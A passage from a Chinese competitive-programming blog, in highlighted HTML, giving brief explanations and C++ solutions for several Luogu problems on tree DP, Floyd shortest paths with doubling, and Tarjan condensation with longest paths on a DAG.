punctuation">)</span><span class="token punctuation">;</span>        dp<span class="token punctuation">[</span>rt<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">+=</span> dp<span class="token punctuation">[</span>it<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">void</span> <span class="token function">solve</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    cin <span class="token operator">>></span> n<span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> i <span class="token operator">&lt;=</span> n<span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span>        cin <span class="token operator">>></span> num<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>    rec<span class="token punctuation">.</span><span class="token function">resize</span><span class="token punctuation">(</span>n <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> n<span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">int</span> x<span class="token punctuation">,</span> y<span class="token punctuation">;</span>        cin <span class="token operator">>></span> x <span class="token operator">>></span> y<span class="token punctuation">;</span>        rec<span class="token punctuation">[</span>y<span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">push_back</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token punctuation">;</span>        vis<span class="token punctuation">[</span>x<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">int</span> rt <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> i <span class="token operator">&lt;=</span> n<span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>vis<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">==</span><span class="token number">0</span><span class="token punctuation">)</span>        <span class="token punctuation">&#123;</span>            rt <span class="token operator">=</span> i<span class="token punctuation">;</span>            <span class="token keyword">break</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token function">dfs</span><span class="token punctuation">(</span>rt<span class="token punctuation">)</span><span class="token punctuation">;</span>    cout <span class="token operator">&lt;&lt;</span> <span class="token function">max</span><span class="token punctuation">(</span>dp<span class="token punctuation">[</span>rt<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span> dp<span class="token punctuation">[</span>rt<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&lt;&lt;</span> <span class="token string">"\n"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><h4 id="P2015-二叉苹果树"><a href="#P2015-二叉苹果树" class="headerlink" title="P2015 二叉苹果树"></a><a href="https://www.luogu.com.cn/problem/P2015">P2015 二叉苹果树</a></h4><ul><li><p>题意：<br>给一棵树和树上$n-1$个边的权值，问如何取边才能做到最大化权值和。</p></li><li><p>题解：<br>$dp[i][j]$第$i$个节点下的子树取 $k$ 个边所能取到的最大权值和。则有状态转移方程:</p></li></ul><p>$dp[u][k]=max(dp[u][k],dp[v][j]+dp[u][k-j-1]+mp[u][v]),k \in [1,q],j \in [0,k-1]$</p><pre class="language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">int</span> n<span class="token punctuation">,</span> q<span class="token punctuation">;</span><span class="token keyword">int</span> mp<span class="token punctuation">[</span><span class="token number">105</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">105</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">int</span> dp<span class="token punctuation">[</span><span class="token number">105</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">105</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">int</span> vis<span class="token punctuation">[</span><span class="token number">105</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token number">0</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>vector<span class="token operator">&lt;</span>vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">>></span> vec<span class="token punctuation">;</span><span class="token keyword">void</span> <span class="token function">dfs</span><span class="token punctuation">(</span><span class="token keyword">int</span> rt<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    vis<span class="token punctuation">[</span>rt<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> vec<span class="token punctuation">[</span>rt<span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>vis<span class="token punctuation">[</span>vec<span class="token punctuation">[</span>rt<span class="token punctuation">]</span><span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">)</span>            <span class="token keyword">continue</span><span class="token punctuation">;</span>        <span class="token function">dfs</span><span class="token punctuation">(</span>vec<span class="token punctuation">[</span>rt<span class="token punctuation">]</span><span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> k <span class="token operator">=</span> q<span class="token punctuation">;</span> k <span class="token operator">>=</span> <span class="token number">1</span><span class="token punctuation">;</span> k<span class="token operator">--</span><span class="token punctuation">)</span>        <span class="token punctuation">&#123;</span>            <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> j <span class="token operator">=</span> k <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">;</span> j <span class="token operator">>=</span> <span class="token number">0</span><span class="token punctuation">;</span> j<span class="token operator">--</span><span class="token punctuation">)</span>            <span class="token punctuation">&#123;</span>                dp<span class="token punctuation">[</span>rt<span class="token punctuation">]</span><span class="token punctuation">[</span>k<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">max</span><span class="token punctuation">(</span>dp<span class="token punctuation">[</span>rt<span class="token punctuation">]</span><span class="token punctuation">[</span>k<span class="token punctuation">]</span><span class="token punctuation">,</span> dp<span class="token punctuation">[</span>vec<span class="token punctuation">[</span>rt<span class="token punctuation">]</span><span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">+</span> dp<span class="token punctuation">[</span>rt<span class="token punctuation">]</span><span class="token punctuation">[</span>k <span class="token operator">-</span> j <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">+</span> mp<span class="token punctuation">[</span>rt<span class="token punctuation">]</span><span class="token punctuation">[</span>vec<span class="token punctuation">[</span>rt<span class="token punctuation">]</span><span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">void</span> <span class="token function">solve</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    cin <span class="token operator">>></span> n <span class="token operator">>></span> q<span class="token punctuation">;</span>    <span class="token keyword">int</span> x<span class="token punctuation">,</span> y<span class="token punctuation">,</span> z<span class="token punctuation">;</span>    vec<span class="token punctuation">.</span><span class="token function">resize</span><span class="token punctuation">(</span>n <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> n<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        cin <span class="token operator">>></span> x <span class="token operator">>></span> y <span class="token operator">>></span> z<span class="token punctuation">;</span>        mp<span class="token punctuation">[</span>x<span class="token punctuation">]</span><span class="token punctuation">[</span>y<span class="token punctuation">]</span> <span class="token operator">=</span> z<span class="token punctuation">,</span> mp<span class="token punctuation">[</span>y<span class="token punctuation">]</span><span class="token punctuation">[</span>x<span class="token punctuation">]</span> <span class="token operator">=</span> z<span class="token punctuation">;</span>        vec<span class="token punctuation">[</span>x<span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">push_back</span><span class="token punctuation">(</span>y<span class="token punctuation">)</span><span class="token punctuation">,</span> vec<span class="token punctuation">[</span>y<span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">push_back</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token function">dfs</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    cout <span class="token operator">&lt;&lt;</span> dp<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">[</span>q<span class="token punctuation">]</span> <span class="token operator">&lt;&lt;</span> <span class="token string">"\n"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><h4 id="P2014-选课"><a href="#P2014-选课" class="headerlink" title="P2014 选课"></a><a href="https://www.luogu.com.cn/problem/P2014">P2014 选课</a></h4><ul><li><p>题意：<br>每门课都有1个权值，和1个或0个先导课，选了先导课才能选其他课，问最大权值和是多少。</p></li><li><p>题解：<br>发现和上一题的思路一样ORZ。</p></li></ul><pre class="language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">int</span> n<span class="token punctuation">,</span> m<span class="token punctuation">;</span><span class="token keyword">int</span> dp<span class="token punctuation">[</span>maxn<span class="token punctuation">]</span><span class="token punctuation">[</span>maxn<span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">int</span> s<span class="token punctuation">[</span>maxn<span class="token punctuation">]</span><span class="token punctuation">,</span> k<span class="token punctuation">[</span>maxn<span class="token punctuation">]</span><span class="token punctuation">;</span>vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span> rec<span class="token punctuation">[</span>maxn<span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">void</span> <span class="token function">dfs</span><span class="token punctuation">(</span><span class="token keyword">int</span> u<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> <span class="token operator">&amp;</span>v <span class="token operator">:</span> rec<span class="token punctuation">[</span>u<span class="token punctuation">]</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token function">dfs</span><span class="token punctuation">(</span>v<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> m <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">;</span> i <span class="token operator">>=</span> <span class="token number">1</span><span class="token punctuation">;</span> i<span class="token operator">--</span><span class="token punctuation">)</span>        <span class="token punctuation">&#123;</span>            <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> j <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> j <span class="token operator">&lt;</span> i<span class="token punctuation">;</span> j<span class="token operator">++</span><span class="token punctuation">)</span>            <span class="token punctuation">&#123;</span>                dp<span class="token punctuation">[</span>u<span class="token punctuation">]</span><span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">max</span><span class="token punctuation">(</span>dp<span class="token punctuation">[</span>u<span class="token punctuation">]</span><span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">,</span> dp<span class="token punctuation">[</span>v<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">+</span> dp<span class="token punctuation">[</span>u<span class="token punctuation">]</span><span class="token punctuation">[</span>i <span class="token operator">-</span> j<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">void</span> <span class="token function">solve</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    cin <span class="token operator">>></span> n <span class="token operator">>></span> m<span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> i <span class="token operator">&lt;=</span> n<span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        cin <span class="token operator">>></span> k<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">>></span> s<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>        rec<span class="token punctuation">[</span>k<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">push_back</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">;</span>        dp<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> s<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token function">dfs</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    cout <span class="token operator">&lt;&lt;</span> dp<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">[</span>m <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">&lt;&lt;</span> <span class="token string">"\n"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><h4 id="P1613-跑路"><a href="#P1613-跑路" class="headerlink" title="P1613 跑路"></a><a href="https://www.luogu.com.cn/problem/P1613">P1613 跑路</a></h4><ul><li><p>题意：<br>按题目描述花最短时间跑路。</p></li><li><p>题解：<br>由于跑 $2^k$ 花费最少，那么只要将每个跑 $2^k$ 的路径预处理花费为1，最后跑一遍最短路即可。</p></li></ul><pre class="language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">int</span> n<span class="token punctuation">,</span> m<span class="token punctuation">;</span><span class="token keyword">int</span> mp<span class="token punctuation">[</span><span class="token number">60</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">60</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">int</span> dis<span class="token punctuation">[</span><span class="token number">60</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">60</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">int</span> dp<span class="token punctuation">[</span><span class="token number">60</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">60</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">70</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token number">0</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span class="token keyword">void</span> <span class="token function">solve</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">int</span> u<span class="token punctuation">,</span> v<span class="token punctuation">;</span>    cin <span class="token operator">>></span> n <span class="token operator">>></span> m<span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;=</span> n <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> j <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> j <span class="token operator">&lt;=</span> n <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">;</span>j<span class="token operator">++</span><span class="token punctuation">)</span>            dis<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">=</span> inf<span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> m<span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        cin <span class="token operator">>></span> u <span class="token operator">>></span> v<span class="token punctuation">;</span>        dis<span class="token punctuation">[</span>u<span class="token punctuation">]</span><span class="token punctuation">[</span>v<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>        dp<span class="token punctuation">[</span>u<span class="token punctuation">]</span><span class="token punctuation">[</span>v<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> o <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> o <span class="token operator">&lt;=</span> <span class="token number">64</span><span class="token punctuation">;</span> o<span class="token operator">++</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> k <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> k <span class="token operator">&lt;=</span> n<span class="token punctuation">;</span> k<span class="token operator">++</span><span class="token punctuation">)</span>        <span class="token punctuation">&#123;</span>            <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> i <span class="token operator">&lt;=</span> n<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span>            <span class="token punctuation">&#123;</span>                <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> j <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> j <span class="token operator">&lt;=</span> n<span class="token punctuation">;</span> j<span class="token operator">++</span><span class="token punctuation">)</span>                <span class="token punctuation">&#123;</span>                    <span class="token keyword">if</span> <span class="token punctuation">(</span>dp<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>k<span class="token punctuation">]</span><span class="token punctuation">[</span>o <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">&amp;&amp;</span> dp<span class="token punctuation">[</span>k<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">[</span>o <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span>                    <span class="token punctuation">&#123;</span>                        dp<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">[</span>o<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>                        dis<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>                    <span class="token punctuation">&#125;</span>                <span class="token punctuation">&#125;</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>            <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> k <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> k <span class="token operator">&lt;=</span> n<span class="token punctuation">;</span>k<span class="token operator">++</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> i <span class="token operator">&lt;=</span> n<span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span>        <span class="token punctuation">&#123;</span>            <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> j <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> j <span class="token operator">&lt;=</span> n<span class="token punctuation">;</span>j<span class="token operator">++</span><span class="token punctuation">)</span>            <span class="token punctuation">&#123;</span>                dis<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">min</span><span class="token punctuation">(</span>dis<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">,</span> dis<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>k<span class="token punctuation">]</span> <span class="token operator">+</span> dis<span class="token punctuation">[</span>k<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    cout <span class="token operator">&lt;&lt;</span> dis<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">[</span>n<span class="token punctuation">]</span> <span class="token operator">&lt;&lt;</span> <span class="token string">"\n"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><h4 id="P2656-采蘑菇"><a href="#P2656-采蘑菇" class="headerlink" title="P2656 采蘑菇"></a><a href="https://www.luogu.com.cn/problem/P2656">P2656 采蘑菇</a></h4><ul><li><p>题意：<br>按题意采蘑菇。</p></li><li><p>题解：<br>这道题目给我做麻了ORZ….最后会有一个精度问题。<br>总的来说还是比较简单的，就是tarjan缩点+拓扑排序(DAG上求最长路)</p></li></ul><pre class="language-cpp" data-language="cpp"><code class="language-cpp"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;bits/stdc++.h></span></span><span class="token keyword">using</span> <span class="token keyword">namespace</span> std<span class="token punctuation">;</span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">ll</span> <span class="token expression"><span class="token keyword">long</span> <span class="token keyword">long</span></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">db</span> <span class="token expression"><span class="token keyword">double</span></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name function">clr</span><span class="token expression"><span class="token punctuation">(</span>a<span class="token punctuation">,</span> b<span class="token punctuation">)</span> <span class="token function">memset</span><span class="token punctuation">(</span>a<span class="token punctuation">,</span> b<span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span><span class="token punctuation">)</span></span></span><span class="token keyword">const</span> <span class="token keyword">int</span> inf <span class="token operator">=</span> <span class="token number">0x7fffffff</span><span class="token punctuation">;</span><span class="token keyword">const</span> <span class="token keyword">int</span> maxn <span class="token operator">=</span> <span class="token number">3e5</span> <span class="token operator">+</span> <span class="token number">10</span><span class="token punctuation">;</span><span class="token keyword">int</span> low<span class="token punctuation">[</span>maxn<span class="token punctuation">]</span><span class="token punctuation">,</span> dfn<span class="token punctuation">[</span>maxn<span class="token punctuation">]</span><span class="token punctuation">,</span> tot <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">,</span> tot2 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token keyword">int</span> head<span class="token punctuation">[</span>maxn<span class="token punctuation">]</span><span class="token punctuation">,</span> head2<span class="token punctuation">[</span>maxn<span class="token punctuation">]</span><span class="token punctuation">,</span> vis<span class="token punctuation">[</span>maxn<span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">int</span> team<span class="token punctuation">[</span>maxn<span class="token punctuation">]</span><span class="token punctuation">,</span> team_value<span class="token punctuation">[</span>maxn<span class="token punctuation">]</span><span class="token punctuation">,</span> in<span class="token punctuation">[</span>maxn<span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">int</span> n<span class="token punctuation">,</span> m<span class="token punctuation">,</span> s<span class="token punctuation">;</span><span class="token keyword">struct</span> <span class="token class-name">node</span><span class="token punctuation">&#123;</span>    <span class="token keyword">int</span> from<span class="token punctuation">;</span>    <span class="token keyword">int</span> to<span class="token punctuation">,</span> w<span class="token punctuation">,</span> next<span class="token punctuation">;</span>    db reco<span class="token punctuation">;</span><span class="token punctuation">&#125;</span> edge<span class="token punctuation">[</span>maxn<span class="token punctuation">]</span><span class="token punctuation">,</span> edge2<span class="token punctuation">[</span>maxn<span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">void</span> <span class="token function">addedge</span><span class="token punctuation">(</span><span class="token keyword">int</span> x<span class="token punctuation">,</span> <span class="token keyword">int</span> y<span class="token punctuation">,</span> <span class="token keyword">int</span> z<span class="token punctuation">,</span> db recover<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    tot<span class="token operator">++</span><span class="token punctuation">;</span>    edge<span class="token punctuation">[</span>tot<span class="token punctuation">]</span><span class="token punctuation">.</span>from <span class="token operator">=</span> x<span class="token punctuation">;</span>    edge<span class="token punctuation">[</span>tot<span class="token punctuation">]</span><span class="token punctuation">.</span>w <span class="token operator">=</span> z<span class="token punctuation">,</span> edge<span class="token punctuation">[</span>tot<span class="token punctuation">]</span><span class="token punctuation">.</span>to <span class="token operator">=</span> y<span class="token punctuation">,</span> edge<span class="token punctuation">[</span>tot<span class="token punctuation">]</span><span class="token punctuation">.</span>next <span class="token operator">=</span> head<span class="token punctuation">[</span>x<span class="token punctuation">]</span><span class="token punctuation">;</span>    edge<span class="token punctuation">[</span>tot<span class="token punctuation">]</span><span class="token punctuation">.</span>reco <span class="token operator">=</span> recover<span class="token punctuation">;</span>    head<span class="token punctuation">[</span>x<span class="token punctuation">]</span> <span class="token operator">=</span> tot<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">void</span> <span class="token function">addedge2</span><span class="token punctuation">(</span><span class="token keyword">int</span> x<span class="token punctuation">,</span> <span class="token keyword">int</span> y<span class="token punctuation">,</span> <span class="token keyword">int</span> z<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    tot2<span class="token operator">++</span><span class="token punctuation">;</span>    edge2<span class="token punctuation">[</span>tot2<span class="token punctuation">]</span><span class="token punctuation">.</span>from <span class="token operator">=</span> x<span class="token punctuation">;</span>    edge2<span class="token punctuation">[</span>tot2<span class="token punctuation">]</span><span class="token punctuation">.</span>w <span class="token operator">=</span> z<span class="token punctuation">,</span> edge2<span class="token punctuation">[</span>tot2<span class="token punctuation">]</span><span class="token punctuation">.</span>to <span class="token operator">=</span> y<span class="token punctuation">,</span> edge2<span class="token punctuation">[</span>tot2<span class="token punctuation">]</span><span class="token punctuation">.</span>next <span class="token operator">=</span> head2<span class="token punctuation">[</span>x<span class="token punctuation">]</span><span class="token punctuation">;</span>    head2<span class="token punctuation">[</span>x<span class="token punctuation">]</span> <span class="token operator">=</span> tot2<span class="token punctuation">;</span><span class="token punctuation">&#125;</span>stack<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">></span> st<span class="token punctuation">;</span><span class="token keyword">int</span> nd <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token keyword">int</span> tot_team <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token keyword">int</span> <span class="token function">cal</span><span class="token punctuation">(</span><span class="token keyword">int</span> x<span class="token punctuation">,</span> db y<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">int</span> sum <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">while</span> <span class="token punctuation">(</span>x<span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        sum <span class="token operator">+=</span> x<span class="token punctuation">;</span>        x <span class="token operator">=</span> <span class="token function">floor</span><span class="token punctuation">(</span><span class="token number">1.0</span> <span class="token operator">*</span> y <span class="token operator">*</span> x<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">return</span> sum<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">void</span> <span class="token function">tarjan</span><span class="token punctuation">(</span><span class="token keyword">int</span> x<span class="token punctuation">)</span><span 